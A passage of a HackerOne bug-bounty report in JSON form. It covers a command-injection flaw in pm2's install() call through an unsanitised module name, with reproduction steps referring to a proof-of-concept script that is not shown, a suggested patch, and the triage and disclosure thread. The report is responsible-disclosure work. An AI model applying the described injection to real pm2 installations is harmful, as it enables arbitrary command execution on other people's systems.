kXWHMyBRZ5m12xEhEj3mDnu3koQSeJRnoNQdEu1tOplrrLMENBFS6mTQ%2BUUBq1sggQqNoyyQNPVrpOTENkW7e%2FKnl%2FHjjMD5ktvCe3RQAaSXnShU%2FFfKQH%2FQlegKj92VkKfFBzGzGJ0gmEIyc6Fl56gBo43TML6rbL9j9QyU%2FpQpXJOVD4OV4s4%2BALvzzN5PLj4E9A%2Bwmv%2FwIgM8BdxFsm0wGfnWsssx3X6cDoUNw7ldQ%3D%3D\u0026amp;X-Amz-Signature=8057985d5aa709c3d9a532bf60bc977ad1d4667ff1022c41e9df862b833c6b15\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003einstall pm2 (\u003ccode\u003enpm i pm2\u003c/code\u003e) - I\u0026#39;ve installed it locally and made symlink to executable \u003ccode\u003epm2\u003c/code\u003e in the same folder\u003c/li\u003e\n\u003cli\u003erun \u003ccode\u003epm2 start\u003c/code\u003e to run and verify if \u003ccode\u003epm2\u003c/code\u003e is installed correctly. You should see output similar to following:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ebl4de:~/playground/Node $ ./pm2 start\n[PM2][ERROR] File ecosystem.config.js not found\n┌──────────┬────┬─────────┬──────┬─────┬────────┬─────────┬────────┬─────┬─────┬──────┬──────────┐\n│ App name │ id │ version │ mode │ pid │ status │ restart │ uptime │ cpu │ mem │ user │ watching │\n└──────────┴────┴─────────┴──────┴─────┴────────┴─────────┴────────┴─────┴─────┴──────┴──────────┘\n Use `pm2 show \u0026lt;id|name\u0026gt;` to get more details about an app\nbl4de:~/playground/Node $\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003esave \u003ccode\u003epm2_exploit.js\u003c/code\u003e provided in section above in the same folder and run it with \u003ccode\u003enode pm2_exploit.js\u003c/code\u003e command\u003c/li\u003e\n\u003cli\u003everify that output contains results of execution of injected commands\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"patch\"\u003ePatch\u003c/h2\u003e\n\n\u003cp\u003e\u003ccode\u003emodule_name\u003c/code\u003e should be sanitized before it reaches execution sink.s\u003c/p\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cp\u003eVulnerability was tested with following configuration:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003emacOS 10.14.5\u003c/li\u003e\n\u003cli\u003eNode 10.13.0\u003c/li\u003e\n\u003cli\u003enpm 6.9.0\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: [N] \u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: [N] \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eCheers,\u003c/p\u003e\n\n\u003cp\u003ebl4de\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker is able to execute arbitrary commands injecting them as a part of npm module to install with \u003ccode\u003epm2.install()\u003c/code\u003e call\u003c/p\u003e\n","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":520353,"file_name":"1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/520/353/339128db22c1db830e0f52547c603610cce91fb9/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWPKTSU4A%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063149Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICR3Wbqr3QmaXXF3DerXHfL2hl5mL6uGPxa9bL7HxbeqAiEAqWiWv4fNm1cBuTJbNOPDhjMWyvgVYBMfeqSvL3C%2Br5kqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDLWeuL88FcgTd%2BHDFiqRA7sDjduiUr7yrR1bP0fy3jpTtTXARM3Gr8rkIOStwiuzOpvS67rApjBlyTcg901MzVj81BMqg2D%2FoYR3%2FSoNuwT33h6KUwD255ES%2FPaggNJ05ASpUwzUlVyePLw4P7in3wPJpZgw9N8dZGDgg6RxPAgdRMTCMAdlbL23s9IEA0HQY%2FGrR4AsNah2Xjle%2Beki0NqkG2PIPu3eRj3%2BQqZznd3OfS%2F2sVbcGOtcKdRNfVO%2Bms3UlWm2aPpwFiBKtt5yY1oKJr%2BgD%2BF%2FSQXzNSV67TxIzKIjNEaMGEHoDWRX0O4KOc6rsER7d7YcxMm3LHCy5VXT6QRFyFg%2FG4p8jairmeusKiaAs0jSa4nN2Zw3%2BCVW97Ila6RUU7muvv0d6W%2FYI6MJm443s6INDwS%2F0HX%2Bw8e4TOsebeohnSpFhM2ci9Q8tz6Q72ZmyHoSODXtdcyWxmKZOiWjWtpBmasfdIsQkZzxOUEp9TeB9Eaq72Q8%2BcHbJ%2Fn4cBcE%2FhCkABtaY7%2BW80JUqsSXPlI8vt2z0j%2B7EAZZMJT4qv8FOusB53xj88px4LwwmmUwc4%2B73P1hcJQ5adArgpVyBc%2Fvo2mvPbSXp8aV8B1%2BrfMDWuQn5Unmirx7fguBekXWHMyBRZ5m12xEhEj3mDnu3koQSeJRnoNQdEu1tOplrrLMENBFS6mTQ%2BUUBq1sggQqNoyyQNPVrpOTENkW7e%2FKnl%2FHjjMD5ktvCe3RQAaSXnShU%2FFfKQH%2FQlegKj92VkKfFBzGzGJ0gmEIyc6Fl56gBo43TML6rbL9j9QyU%2FpQpXJOVD4OV4s4%2BALvzzN5PLj4E9A%2Bwmv%2FwIgM8BdxFsm0wGfnWsssx3X6cDoUNw7ldQ%3D%3D\u0026X-Amz-Signature=8218d40e114c406835051cba25595dea0ecbec86f002e8a5055c9ee56ffff7b5","file_size":724472,"type":"image/png"},{"id":520354,"file_name":"2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/520/354/4b3c5accfa7c0c0dfe6e88a01b50d38cb053c0dd/2.png?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWPKTSU4A%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063149Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICR3Wbqr3QmaXXF3DerXHfL2hl5mL6uGPxa9bL7HxbeqAiEAqWiWv4fNm1cBuTJbNOPDhjMWyvgVYBMfeqSvL3C%2Br5kqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDLWeuL88FcgTd%2BHDFiqRA7sDjduiUr7yrR1bP0fy3jpTtTXARM3Gr8rkIOStwiuzOpvS67rApjBlyTcg901MzVj81BMqg2D%2FoYR3%2FSoNuwT33h6KUwD255ES%2FPaggNJ05ASpUwzUlVyePLw4P7in3wPJpZgw9N8dZGDgg6RxPAgdRMTCMAdlbL23s9IEA0HQY%2FGrR4AsNah2Xjle%2Beki0NqkG2PIPu3eRj3%2BQqZznd3OfS%2F2sVbcGOtcKdRNfVO%2Bms3UlWm2aPpwFiBKtt5yY1oKJr%2BgD%2BF%2FSQXzNSV67TxIzKIjNEaMGEHoDWRX0O4KOc6rsER7d7YcxMm3LHCy5VXT6QRFyFg%2FG4p8jairmeusKiaAs0jSa4nN2Zw3%2BCVW97Ila6RUU7muvv0d6W%2FYI6MJm443s6INDwS%2F0HX%2Bw8e4TOsebeohnSpFhM2ci9Q8tz6Q72ZmyHoSODXtdcyWxmKZOiWjWtpBmasfdIsQkZzxOUEp9TeB9Eaq72Q8%2BcHbJ%2Fn4cBcE%2FhCkABtaY7%2BW80JUqsSXPlI8vt2z0j%2B7EAZZMJT4qv8FOusB53xj88px4LwwmmUwc4%2B73P1hcJQ5adArgpVyBc%2Fvo2mvPbSXp8aV8B1%2BrfMDWuQn5Unmirx7fguBekXWHMyBRZ5m12xEhEj3mDnu3koQSeJRnoNQdEu1tOplrrLMENBFS6mTQ%2BUUBq1sggQqNoyyQNPVrpOTENkW7e%2FKnl%2FHjjMD5ktvCe3RQAaSXnShU%2FFfKQH%2FQlegKj92VkKfFBzGzGJ0gmEIyc6Fl56gBo43TML6rbL9j9QyU%2FpQpXJOVD4OV4s4%2BALvzzN5PLj4E9A%2Bwmv%2FwIgM8BdxFsm0wGfnWsssx3X6cDoUNw7ldQ%3D%3D\u0026X-Amz-Signature=8aff17c9518617eeedc2448b30d9977f154b074d46d74b77b31fd0ba429149a4","file_size":862170,"type":"image/png"},{"id":520355,"file_name":"3.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/520/355/02664e2b65f66de5c6b11c2ce08f8e39c2320d2b/3.png?response-content-disposition=attachment%3B%20filename%3D%223.png%22%3B%20filename%2A%3DUTF-8%27%273.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWPKTSU4A%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063149Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICR3Wbqr3QmaXXF3DerXHfL2hl5mL6uGPxa9bL7HxbeqAiEAqWiWv4fNm1cBuTJbNOPDhjMWyvgVYBMfeqSvL3C%2Br5kqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDLWeuL88FcgTd%2BHDFiqRA7sDjduiUr7yrR1bP0fy3jpTtTXARM3Gr8rkIOStwiuzOpvS67rApjBlyTcg901MzVj81BMqg2D%2FoYR3%2FSoNuwT33h6KUwD255ES%2FPaggNJ05ASpUwzUlVyePLw4P7in3wPJpZgw9N8dZGDgg6RxPAgdRMTCMAdlbL23s9IEA0HQY%2FGrR4AsNah2Xjle%2Beki0NqkG2PIPu3eRj3%2BQqZznd3OfS%2F2sVbcGOtcKdRNfVO%2Bms3UlWm2aPpwFiBKtt5yY1oKJr%2BgD%2BF%2FSQXzNSV67TxIzKIjNEaMGEHoDWRX0O4KOc6rsER7d7YcxMm3LHCy5VXT6QRFyFg%2FG4p8jairmeusKiaAs0jSa4nN2Zw3%2BCVW97Ila6RUU7muvv0d6W%2FYI6MJm443s6INDwS%2F0HX%2Bw8e4TOsebeohnSpFhM2ci9Q8tz6Q72ZmyHoSODXtdcyWxmKZOiWjWtpBmasfdIsQkZzxOUEp9TeB9Eaq72Q8%2BcHbJ%2Fn4cBcE%2FhCkABtaY7%2BW80JUqsSXPlI8vt2z0j%2B7EAZZMJT4qv8FOusB53xj88px4LwwmmUwc4%2B73P1hcJQ5adArgpVyBc%2Fvo2mvPbSXp8aV8B1%2BrfMDWuQn5Unmirx7fguBekXWHMyBRZ5m12xEhEj3mDnu3koQSeJRnoNQdEu1tOplrrLMENBFS6mTQ%2BUUBq1sggQqNoyyQNPVrpOTENkW7e%2FKnl%2FHjjMD5ktvCe3RQAaSXnShU%2FFfKQH%2FQlegKj92VkKfFBzGzGJ0gmEIyc6Fl56gBo43TML6rbL9j9QyU%2FpQpXJOVD4OV4s4%2BALvzzN5PLj4E9A%2Bwmv%2FwIgM8BdxFsm0wGfnWsssx3X6cDoUNw7ldQ%3D%3D\u0026X-Amz-Signature=19c732ce11f282a604ed9ef8385182ec7b8bd5bbd074813356e9efee3848cb26","file_size":7155466,"type":"image/png"}],"allow_singular_disclosure_at":"2019-10-24T09:52:49.202Z","allow_singular_disclosure_after":-37312739.82168653,"singular_disclosure_allowed":true,"vote_count":3,"voters":["0x0fbi","wildstyle7","lileggrolls"],"severity":{"rating":"medium","score":6.4,"author_type":"Team","metrics":{"attack_vector":"local","attack_complexity":"high","privileges_required":"high","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":2986,"asset_type":"SOURCE_CODE","asset_identifier":"Other module","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":5241409,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello @bl4de - How is this different, compared to #630227? I can see that the two reports follow the same reproduction steps.\n\nCheers,\n@bassguitar ","markdown_message":"\u003cp\u003eHello \u003ca href=\"/bl4de\"\u003e@bl4de\u003c/a\u003e - How is this different, compared to \u003ca href=\"/reports/630227\"\u003e#630227\u003c/a\u003e? I can see that the two reports follow the same reproduction steps.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\n\u003ca href=\"/bassguitar\"\u003e@bassguitar\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-02T21:08:28.132Z","updated_at":"2019-07-02T21:08:28.132Z","actor":{"username":"bassguitar","cleared":false,"url":"/bassguitar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/352/794/5d82b321348f78aa4ac9c82c0bdd004828bcb414_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5241456,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @bassguitar ,\n\nReproduction steps are the same and initial injection vector is similar, but the vulnerability exists in two different places and fixing it in one place does not remediate an injection in the second one.\n\nIf you will follow details in provided PoCs in both reports, you will see the differences and that payloads reach two different execution sinks.\n\nCheers,\n\nbl4de\n\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/bassguitar\"\u003e@bassguitar\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eReproduction steps are the same and initial injection vector is similar, but the vulnerability exists in two different places and fixing it in one place does not remediate an injection in the second one.\u003c/p\u003e\n\n\u003cp\u003eIf you will follow details in provided PoCs in both reports, you will see the differences and that payloads reach two different execution sinks.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003c/p\u003e\n\n\u003cp\u003ebl4de\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-02T21:22:33.347Z","updated_at":"2019-07-02T21:23:00.839Z","actor":{"username":"bl4de","cleared":false,"url":"/bl4de","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5299074,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-11T09:19:17.343Z","updated_at":"2019-07-11T09:19:17.343Z","additional_data":{"old_severity":"Medium","new_severity":"Medium (6.4)","old_severity_id":448492,"new_severity_id":456057},"actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5299115,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"I was able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nKind regards,\n@beagle  ","markdown_message":"\u003cp\u003eI was able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/beagle\"\u003e@beagle\u003c/a\u003e  \u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-11T09:26:43.507Z","updated_at":"2019-07-11T09:26:43.507Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5299286,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @beagle ,\n\nThank you for the update!\n\nCheers,\n\nbl4de","markdown_message":"\u003cp\u003eHi \u003ca href=\"/beagle\"\u003e@beagle\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eThank you for the update!\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003c/p\u003e\n\n\u003cp\u003ebl4de\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-11T10:10:21.262Z","updated_at":"2019-07-11T10:10:21.262Z","actor":{"username":"bl4de","cleared":false,"url":"/bl4de","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5727747,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@bl4de Thanks for a very details report I will reach out to the pm2 team to notify them (along with #630227).","markdown_message":"\u003cp\u003e\u003ca href=\"/bl4de\"\u003e@bl4de\u003c/a\u003e Thanks for a very details report I will reach out to the pm2 team to notify them (along with \u003ca href=\"/reports/630227\"\u003e#630227\u003c/a\u003e).\u003c/p\u003e\n","automated_response":false,"created_at":"2019-09-04T12:54:49.590Z","updated_at":"2019-09-04T12:54:49.590Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5736639,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @marcinhoppe ,\n\nThank you! Let me know if they will need any additional information about those issues.\n\nCheers,\n\nbl4de","markdown_message":"\u003cp\u003eHi \u003ca href=\"/marcinhoppe\"\u003e@marcinhoppe\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eThank you! Let me know if they will need any additional information about those issues.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003c/p\u003e\n\n\u003cp\u003ebl4de\u003c/p\u003e\n","automated_response":false,"created_at":"2019-09-05T08:57:13.773Z","updated_at":"2019-09-05T08:57:13.773Z","actor":{"username":"bl4de","cleared":false,"url":"/bl4de","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5876088,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-09-24T09:52:41.748Z","updated_at":"2019-09-24T09:52:41.748Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"bl4de","url":"/bl4de"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5876089,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-09-24T09:52:48.791Z","updated_at":"2019-09-24T09:52:48.791Z","first_to_agree":true,"actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6124043,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-24T09:52:55.374Z","updated_at":"2019-10-24T09:52:55.374Z","actor":{"url":"/nodejs-ecosystem","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Node.js third-party modules"}},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}